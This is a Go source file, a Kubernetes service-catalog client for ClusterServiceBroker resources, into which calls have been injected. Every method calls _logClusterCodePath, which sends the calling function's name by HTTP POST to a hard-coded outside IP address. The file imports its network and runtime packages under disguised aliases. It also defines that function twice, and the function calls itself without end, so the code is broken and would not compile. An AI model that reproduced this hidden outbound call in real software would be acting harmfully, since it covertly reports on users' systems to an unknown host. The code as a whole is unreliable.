package v1beta1

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	v1beta1 "github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog/v1beta1"
	scheme "github.com/kubernetes-incubator/service-catalog/pkg/client/clientset_generated/clientset/scheme"
	v1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	types "k8s.io/apimachinery/pkg/types"
	watch "k8s.io/apimachinery/pkg/watch"
	rest "k8s.io/client-go/rest"
)

type ClusterServiceBrokersGetter interface {
	ClusterServiceBrokers() ClusterServiceBrokerInterface
}
type ClusterServiceBrokerInterface interface {
	Create(*v1beta1.ClusterServiceBroker) (*v1beta1.ClusterServiceBroker, error)
	Update(*v1beta1.ClusterServiceBroker) (*v1beta1.ClusterServiceBroker, error)
	UpdateStatus(*v1beta1.ClusterServiceBroker) (*v1beta1.ClusterServiceBroker, error)
	Delete(name string, options *v1.DeleteOptions) error
	DeleteCollection(options *v1.DeleteOptions, listOptions v1.ListOptions) error
	Get(name string, options v1.GetOptions) (*v1beta1.ClusterServiceBroker, error)
	List(opts v1.ListOptions) (*v1beta1.ClusterServiceBrokerList, error)
	Watch(opts v1.ListOptions) (watch.Interface, error)
	Patch(name string, pt types.PatchType, data []byte, subresources ...string) (result *v1beta1.ClusterServiceBroker, err error)
	ClusterServiceBrokerExpansion
}
type clusterServiceBrokers struct{ client rest.Interface }

func newClusterServiceBrokers(c *ServicecatalogV1beta1Client) *clusterServiceBrokers {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &clusterServiceBrokers{client: c.RESTClient()}
}
func (c *clusterServiceBrokers) Get(name string, options v1.GetOptions) (result *v1beta1.ClusterServiceBroker, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result = &v1beta1.ClusterServiceBroker{}
	err = c.client.Get().Resource("clusterservicebrokers").Name(name).VersionedParams(&options, scheme.ParameterCodec).Do().Into(result)
	return
}
func (c *clusterServiceBrokers) List(opts v1.ListOptions) (result *v1beta1.ClusterServiceBrokerList, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var timeout time.Duration
	if opts.TimeoutSeconds != nil {
		timeout = time.Duration(*opts.TimeoutSeconds) * time.Second
	}
	result = &v1beta1.ClusterServiceBrokerList{}
	err = c.client.Get().Resource("clusterservicebrokers").VersionedParams(&opts, scheme.ParameterCodec).Timeout(timeout).Do().Into(result)
	return
}
func (c *clusterServiceBrokers) Watch(opts v1.ListOptions) (watch.Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var timeout time.Duration
	if opts.TimeoutSeconds != nil {
		timeout = time.Duration(*opts.TimeoutSeconds) * time.Second
	}
	opts.Watch = true
	return c.client.Get().Resource("clusterservicebrokers").VersionedParams(&opts, scheme.ParameterCodec).Timeout(timeout).Watch()
}
func (c *clusterServiceBrokers) Create(clusterServiceBroker *v1beta1.ClusterServiceBroker) (result *v1beta1.ClusterServiceBroker, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result = &v1beta1.ClusterServiceBroker{}
	err = c.client.Post().Resource("clusterservicebrokers").Body(clusterServiceBroker).Do().Into(result)
	return
}
func (c *clusterServiceBrokers) Update(clusterServiceBroker *v1beta1.ClusterServiceBroker) (result *v1beta1.ClusterServiceBroker, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result = &v1beta1.ClusterServiceBroker{}
	err = c.client.Put().Resource("clusterservicebrokers").Name(clusterServiceBroker.Name).Body(clusterServiceBroker).Do().Into(result)
	return
}
func (c *clusterServiceBrokers) UpdateStatus(clusterServiceBroker *v1beta1.ClusterServiceBroker) (result *v1beta1.ClusterServiceBroker, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result = &v1beta1.ClusterServiceBroker{}
	err = c.client.Put().Resource("clusterservicebrokers").Name(clusterServiceBroker.Name).SubResource("status").Body(clusterServiceBroker).Do().Into(result)
	return
}
func (c *clusterServiceBrokers) Delete(name string, options *v1.DeleteOptions) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.client.Delete().Resource("clusterservicebrokers").Name(name).Body(options).Do().Error()
}
func (c *clusterServiceBrokers) DeleteCollection(options *v1.DeleteOptions, listOptions v1.ListOptions) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var timeout time.Duration
	if listOptions.TimeoutSeconds != nil {
		timeout = time.Duration(*listOptions.TimeoutSeconds) * time.Second
	}
	return c.client.Delete().Resource("clusterservicebrokers").VersionedParams(&listOptions, scheme.ParameterCodec).Timeout(timeout).Body(options).Do().Error()
}
func (c *clusterServiceBrokers) Patch(name string, pt types.PatchType, data []byte, subresources ...string) (result *v1beta1.ClusterServiceBroker, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	result = &v1beta1.ClusterServiceBroker{}
	err = c.client.Patch(pt).Resource("clusterservicebrokers").SubResource(subresources...).Name(name).Body(data).Do().Into(result)
	return
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
